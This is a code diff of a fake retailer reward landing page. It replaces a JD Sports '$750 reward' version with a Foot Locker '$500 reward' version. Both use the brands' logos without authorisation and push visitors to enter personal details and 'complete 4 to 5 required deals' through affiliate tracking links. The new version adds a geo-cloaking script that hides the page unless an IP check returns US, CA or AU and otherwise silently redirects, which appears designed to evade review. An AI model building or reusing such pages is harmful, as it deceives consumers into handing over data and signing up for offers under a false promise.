@@ -1,330 +1,221 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>JD Sports Reward – Claim Now</title>
-    <meta name="robots" content="noindex, nofollow">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
+    <title>Foot Locker $500 Reward - Premium Deals</title>
+    <meta name="description"
+        content="Claim your $500 Foot Locker reward today. Valid on all Nike merchandise including sneakers, apparel, and backpacks.">
+
+    <!-- Seamless Geo-Redirection Script -->
+    <style id="geo-cloak">
+        /* Completely hides the page content until the country is verified */
+        body {
+            opacity: 0 !important;
+            visibility: hidden !important;
+            background-color: #F4F7FA !important;
+        }
+    </style>
+    <script>
+        (function () {
+            var allowedCountries = ['US', 'CA', 'AU'];
+            var redirectUrl = '/en';
+
+            // Ultra-fast client-side IP check
+            fetch('https://get.geojs.io/v1/ip/country.json')
+                .then(function (res) { return res.json(); })
+                .then(function (data) {
+                    if (data && data.country && allowedCountries.indexOf(data.country) !== -1) {
+                        // User is in US, CA, or AU -> Uncloak the page
+                        var cloak = document.getElementById('geo-cloak');
+                        if (cloak) cloak.remove();
+                    } else {
+                        // User is outside the 3 countries -> Redirect instantly without keeping history
+                        window.location.replace(redirectUrl);
+                    }
+                })
+                .catch(function () {
+                    // Fallback: If API is blocked by adblockers, reveal page so we don't lose traffic
+                    var cloak = document.getElementById('geo-cloak');
+                    if (cloak) cloak.remove();
+                });
+        })();
+    </script>
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+
     <style>
-        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        :root {
-            /* JD Sports Branded Color Palette */
-            --brand: #000000;
-            --brand-dark: #111111;
-            --brand-accent: #FFD100; /* Signature JD Yellow */
-            --brand-accent-hover: #e6bc00;
-            --brand-light: #18181b;
-            
-            --text: #FFFFFF;
-            --text-dark: #111111;
-            --text-mid: #A1A1AA;
-            --text-light: #71717A;
-            --border: #27272A;
-            --card-bg: #121214;
-            --bg: #09090B;
-            --font: 'Inter', sans-serif;
-            --font-mono: 'JetBrains Mono', monospace;
-        }
-
-        html, body { 
-            height: 100dvh; 
-            overflow: hidden; 
-            background: var(--bg); 
-            color: var(--text); 
-            font-family: var(--font); 
+        body {
+            background-color: #F4F7FA;
             -webkit-font-smoothing: antialiased;
+            overflow: hidden;
+            height: 100dvh;
+            font-family: 'Inter', sans-serif;
+            color: #1e293b;
         }
         
-        .page { 
-            width: 100%; 
-            height: 100dvh; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            padding: 1.5vh 4vw; 
-            background: radial-gradient(circle at 50% 0%, #1c1c21 0%, #09090B 100%);
-            position: relative;
+        /* Subtle Foot Locker referee stripe pattern for the reward card */
+        .stripe-pattern {
+            background-image: repeating-linear-gradient(45deg, rgba(255,255,255,0.03), rgba(255,255,255,0.03) 10px, transparent 10px, transparent 20px);
         }
-
-        .container { 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            width: 100%; 
-            max-width: 380px; 
-            height: 100%; 
-            max-height: 100dvh;
-            justify-content: center; 
-            gap: 1.8vh; 
-            position: relative;
-            z-index: 10;
-        }
-
-        .voucher {
-            width: 100%; 
-            background: #ffffff; 
-            border-radius: 14px; 
-            position: relative;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5); 
-            border: 2px dashed #000000;
-            padding: clamp(14px, 2.4vh, 20px); 
-            display: flex; 
-            flex-direction: column;
-            gap: 1.2vh; 
-            flex-shrink: 0; 
-            transition: transform 0.2s;
-        }
-        .voucher:hover { transform: translateY(-2px); }
-        
-        .voucher::before, .voucher::after {
-            content: ''; 
-            position: absolute; 
-            top: 50%; 
-            width: 20px; 
-            height: 20px;
-            background: var(--bg); 
-            border-radius: 50%; 
-            transform: translateY(-50%);
-            border: 2px dashed #333333;
-        }
-        .voucher::before { left: -12px; border-right-color: transparent; border-top-color: transparent; transform: translateY(-50%) rotate(45deg); }
-        .voucher::after { right: -12px; border-left-color: transparent; border-bottom-color: transparent; transform: translateY(-50%) rotate(45deg); }
-
-        .v-top { 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center; 
-            border-bottom: 1px solid #e4e4e7; 
-            padding-bottom: 1.2vh; 
-        }
-        .v-logo { 
-            height: clamp(26px, 4.5vh, 36px); 
-            max-width: 150px;
-            object-fit: contain; 
-        }
-        .v-badge { 
-            background: #000000; 
-            color: var(--brand-accent); 
-            font-size: clamp(0.6rem, 1.1vh, 0.7rem); 
-            font-weight: 800; 
-            padding: 4px 10px; 
-            border-radius: 100px; 
-            text-transform: uppercase; 
-            letter-spacing: 1px; 
-        }
-
-        .v-mid { text-align: center; padding: 0.5vh 0; }
-        .v-label { 
-            font-size: clamp(0.6rem, 1.2vh, 0.7rem); 
-            color: #52525b; 
-            text-transform: uppercase; 
-            font-weight: 700; 
-            letter-spacing: 1.5px; 
-            margin-bottom: 2px; 
-        }
-        .v-amount { 
-            font-family: var(--font-mono); 
-            font-size: clamp(2.5rem, 5.5vh, 3.2rem); 
-            font-weight: 800; 
-            color: #000000; 
-            line-height: 1; 
-        }
-        .v-amount span { 
-            font-size: clamp(1.2rem, 2.5vh, 1.5rem); 
-            vertical-align: text-top; 
-        }
-
-        .v-bot { 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: flex-end; 
-            padding-top: 0.8vh; 
-            border-top: 1px dashed #e4e4e7;
-        }
-        .v-barcode { 
-            display: flex; 
-            gap: 2px; 
-            height: clamp(18px, 3.5vh, 24px); 
-            align-items: stretch; 
-            opacity: 0.85; 
-        }
-        .v-barcode i { background: #000000; border-radius: 1px; }
-        .v-status { 
-            font-size: clamp(0.65rem, 1.2vh, 0.75rem); 
-            font-weight: 800; 
-            color: #000000; 
-            display: flex; 
-            align-items: center; 
-            gap: 5px; 
-        }
-        .v-status::before { 
-            content: ''; 
-            width: 6px; 
-            height: 6px; 
-            border-radius: 50%; 
-            background: #10B981; 
-            box-shadow: 0 0 6px #10B981;
-        }
-
-        .steps { 
-            width: 100%; 
-            background: var(--card-bg); 
-            border-radius: 14px; 
-            padding: clamp(6px, 1vh, 10px) 20px; 
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3); 
-            border: 1px solid var(--border); 
-            flex-shrink: 1; 
-            position: relative; 
-        }
-        .steps::before { 
-            content: ''; 
-            position: absolute; 
-            left: 33px; 
-            top: clamp(20px, 3vh, 28px); 
-            bottom: clamp(20px, 3vh, 28px); 
-            width: 2px; 
-            background: var(--border); 
-            z-index: 0; 
-            opacity: 0.8; 
-        }
-        .step { 
-            display: flex; 
-            align-items: center; 
-            gap: 14px; 
-            padding: clamp(10px, 1.6vh, 14px) 0; 
-            position: relative; 
-            z-index: 1; 
-        }
-        .step:not(:last-child) { border-bottom: 1px solid #1c1c1e; }
-        .s-icon { 
-            width: 28px; 
-            height: 28px; 
-            border-radius: 50%; 
-            background: #18181b; 
-            border: 2px solid var(--border); 
-            color: var(--text-mid); 
-            font-weight: 800; 
-            font-size: 0.8rem; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            flex-shrink: 0; 
-            transition: 0.2s; 
-            z-index: 2; 
-        }
-        .step:last-child .s-icon { 
-            background: var(--brand-accent); 
-            border-color: var(--brand-accent); 
-            color: #000000; 
-            box-shadow: 0 2px 10px rgba(255, 209, 0, 0.4); 
-        }
-        .s-txt { 
-            font-size: clamp(0.75rem, 1.5vh, 0.85rem); 
-            font-weight: 600; 
-            color: var(--text); 
-            flex: 1; 
-        }
-
-        .cta-wrap { width: 100%; text-align: center; flex-shrink: 0; }
-        .btn { 
-            width: 100%; 
-            padding: clamp(12px, 2vh, 16px); 
-            font-size: clamp(1rem, 2vh, 1.1rem); 
-            font-weight: 800; 
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            color: #000000; 
-            background: var(--brand-accent); 
-            border: none; 
-            border-radius: 12px; 
-            cursor: pointer; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            position: relative; 
-            transition: all 0.2s; 
-            box-shadow: 0 4px 18px rgba(255, 209, 0, 0.3); 
-            min-height: clamp(48px, 6.5vh, 56px); 
-            margin-bottom: 6px; 
-        }
-        .btn:hover { 
-            background: var(--brand-accent-hover); 
-            transform: translateY(-2px); 
-            box-shadow: 0 6px 22px rgba(255, 209, 0, 0.45);
-        }
-        .btn-txt { transition: 0.2s; }
-        
-        .spinner { 
-            position: absolute; 
-            width: 22px; 
-            height: 22px; 
-            border: 3px solid rgba(0,0,0,0.2); 
-            border-top-color: #000000; 
-            border-radius: 50%; 
-            opacity: 0; 
-            animation: spin 0.8s linear infinite; 
-        }
-        .btn.loading .btn-txt { opacity: 0; } 
-        .btn.loading .spinner { opacity: 1; pointer-events: none; }
-        
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .note { font-size: clamp(0.6rem, 1.1vh, 0.7rem); color: var(--text-mid); }
     </style>
 </head>
-<body>
-    <div class="page">
-        <div class="container">
-            
-            <div class="voucher">
-                <div class="v-top">
-                    <!-- JD Sports Logo -->
-                    <img src="https://cdn.freebiesupply.com/logos/large/2x/jd-sports-logo-png-transparent.png" 
-                         alt="JD Sports Logo" 
-                         class="v-logo"
-                         onerror="this.onerror=null; this.src='https://placehold.co/180x50/000000/FFD100?text=JD+SPORTS';">
-                    <div class="v-badge">Reward</div>
+
+<body class="h-[100dvh] w-full overflow-hidden">
+    <div class="w-full max-w-md mx-auto px-5 h-full flex flex-col justify-between py-4">
+
+        <!-- Logo & Title Section -->
+        <div class="flex flex-col items-center justify-center shrink-0 mt-1">
+            <div class="w-16 h-16 bg-white rounded-2xl shadow-sm border border-slate-200 flex items-center justify-center mb-2 p-2">
+                <img src="https://images.seeklogo.com/logo-png/5/1/foot-locker-logo-png_seeklogo-56477.png" 
+                     alt="Foot Locker" 
+                     class="w-full h-full object-contain">
+            </div>
+            <h1 class="text-xl font-extrabold text-slate-900 tracking-tight text-center leading-tight">
+                Foot Locker Reward
+            </h1>
+        </div>
+
+        <!-- Dynamic Reward Card ($500) -->
+        <div class="rounded-xl p-5 shadow-lg shrink-0 relative overflow-hidden flex justify-between items-center text-white bg-[#111111]">
+            <div class="absolute inset-0 stripe-pattern pointer-events-none"></div>
+            <div class="absolute -right-8 -top-8 w-28 h-28 bg-white opacity-5 rounded-full pointer-events-none"></div>
+
+            <div class="relative z-10">
+                <div class="text-4xl font-extrabold tracking-tight mb-0.5 leading-none drop-shadow-md">
+                    $500
                 </div>
-                <div class="v-mid">
-                    <div class="v-label">Reward Balance</div>
-                    <div class="v-amount"><span>$</span>750</div>
-                </div>
-                <div class="v-bot">
-                    <div class="v-barcode">
-                        <i style="width: 2px"></i><i style="width: 4px"></i><i style="width: 1px"></i><i style="width: 3px"></i><i style="width: 2px"></i><i style="width: 1px"></i><i style="width: 4px"></i><i style="width: 2px"></i><i style="width: 3px"></i><i style="width: 1px"></i><i style="width: 2px"></i><i style="width: 4px"></i><i style="width: 1px"></i>
-                    </div>
-                    <div class="v-status">ACTIVE</div>
+                <div class="font-bold text-[10px] uppercase tracking-widest text-slate-400 mt-1.5">
+                    Reward Value
                 </div>
             </div>
-
-            <div class="steps">
-                <div class="step"><div class="s-icon">1</div><div class="s-txt">Click the button below</div></div>
-                <div class="step"><div class="s-icon">2</div><div class="s-txt">Enter your email &amp; basic info</div></div>
-                <div class="step"><div class="s-icon">3</div><div class="s-txt">Complete 4 to 5 required deals</div></div>
-                <div class="step"><div class="s-icon">4</div><div class="s-txt">Receive your reward once verified</div></div>
+            <div class="relative z-10 bg-white/10 p-3 rounded-full backdrop-blur-md shadow-sm border border-white/20">
+                <i data-lucide="gift" class="w-6 h-6 text-white"></i>
             </div>
+        </div>
 
-            <div class="cta-wrap">
-                <button class="btn" id="claim-btn"><span class="btn-txt">Claim Reward</span><span class="spinner"></span></button>
-                <div class="note">Available in US, CA, AU, UK</div>
+        <!-- Important Nike Notice Box (Simplified) -->
+        <div class="bg-red-50 border border-red-100 p-3 rounded-lg flex items-center gap-3 shrink-0">
+            <div class="bg-red-600 text-white p-1.5 rounded-full shrink-0 shadow-sm">
+                <i data-lucide="tag" class="w-4 h-4"></i>
             </div>
+            <p class="text-slate-800 text-[12px] leading-tight font-medium">
+                Valid on all <span class="font-bold text-slate-900">Nike merchandise</span> (sneakers, apparel, backpacks).
+            </p>
+        </div>
 
+        <!-- Application Process / Steps -->
+        <div class="flex-grow flex flex-col justify-center py-1">
+            <h2 class="text-slate-900 font-extrabold mb-2.5 text-sm tracking-tight text-center">
+                How to claim your reward:
+            </h2>
+
+            <div class="space-y-2">
+                <div class="bg-white p-3 rounded-xl shadow-sm border border-slate-100 flex gap-3 items-center">
+                    <div class="w-7 h-7 shrink-0 rounded-full bg-[#111111] text-white flex items-center justify-center font-bold text-xs shadow-inner">1</div>
+                    <div class="font-bold text-slate-800 text-xs">Click the Claim button below</div>
+                </div>
+
+                <div class="bg-white p-3 rounded-xl shadow-sm border border-slate-100 flex gap-3 items-center">
+                    <div class="w-7 h-7 shrink-0 rounded-full bg-[#111111] text-white flex items-center justify-center font-bold text-xs shadow-inner">2</div>
+                    <div class="font-bold text-slate-800 text-xs">Enter your email & basic info</div>
+                </div>
+
+                <div class="bg-white p-3 rounded-xl shadow-sm border border-slate-100 flex gap-3 items-center">
+                    <div class="w-7 h-7 shrink-0 rounded-full bg-[#111111] text-white flex items-center justify-center font-bold text-xs shadow-inner">3</div>
+                    <div class="font-bold text-slate-800 text-xs">Complete 4 to 5 required deals</div>
+                </div>
+
+                <div class="bg-white p-3 rounded-xl shadow-sm border border-slate-100 flex gap-3 items-center">
+                    <div class="w-7 h-7 shrink-0 rounded-full bg-[#111111] text-white flex items-center justify-center font-bold text-xs shadow-inner">4</div>
+                    <div class="font-bold text-slate-800 text-xs">Receive your reward once verified</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom CTA Area -->
+        <div class="w-full shrink-0 pb-1">
+            <button id="startBtn"
+                class="w-full bg-[#E31837] text-white rounded-xl py-3.5 font-extrabold text-[1.05rem] shadow-lg shadow-red-500/30 transition-transform hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-2 relative cursor-pointer">
+                <span id="btnText" class="flex items-center gap-2 transition-opacity duration-200">
+                    Claim Reward
+                    <i data-lucide="arrow-right" class="w-5 h-5"></i>
+                </span>
+                <i id="btnSpinner" data-lucide="loader-2"
+                    class="w-6 h-6 animate-spin absolute opacity-0 transition-opacity duration-200 pointer-events-none"></i>
+            </button>
+
+            <p class="text-center text-[10px] font-bold text-slate-400 mt-2.5 uppercase tracking-wider">
+                Available in US, CA, AU
+            </p>
         </div>
     </div>
 
+    <!-- Application Logic -->
     <script>
-    (function() {
-        const claimBtn = document.getElementById('claim-btn');
-        claimBtn.addEventListener('click', () => {
-            claimBtn.classList.add('loading');
+        // Set the destination tracking link provided
+        const targetUrl = 'https://trksy.org/aff_c?offer_id=1727&aff_id=171242&source=wahatope';
+        const startBtn = document.getElementById('startBtn');
+
+        // Handles the loading state animation on the button
+        function setLoadingState(isLoading) {
+            const dynBtnText = document.getElementById('btnText');
+            const dynBtnSpinner = document.getElementById('btnSpinner');
+
+            if (!dynBtnText || !dynBtnSpinner) return;
+
+            if (isLoading) {
+                dynBtnText.classList.add('opacity-0');
+                dynBtnSpinner.classList.remove('opacity-0');
+                startBtn.classList.add('pointer-events-none');
+            } else {
+                dynBtnText.classList.remove('opacity-0');
+                dynBtnSpinner.classList.add('opacity-0');
+                startBtn.classList.remove('pointer-events-none');
+            }
+        }
+
+        // Button Click Handler
+        startBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            setLoadingState(true);
+
+            // Brief delay for UX, then redirect
             setTimeout(() => {
-                // Affiliate Link
-                window.location.href = 'https://linkthem.net/aff_c?offer_id=1149&aff_id=171242&source=wahabtope';
-            }, 800);
+                window.location.href = targetUrl;
+            }, 200);
+
+            // Safety fallback: reset button after 2.5 seconds if the page doesn't unload
+            setTimeout(() => {
+                setLoadingState(false);
+            }, 2500);
         });
-    })();
+
+        // Reset button state cleanly if the user navigates back using browser history
+        window.addEventListener('pageshow', (event) => {
+            if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
+                setLoadingState(false);
+            }
+        });
+
+        // Bulletproof back-button reset using the Page Visibility API
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === 'visible') {
+                setLoadingState(false);
+            }
+        });
+
+        // Initialize Icons
+        document.addEventListener('DOMContentLoaded', () => {
+            lucide.createIcons();
+        });
     </script>
 </body>
+
 </html>
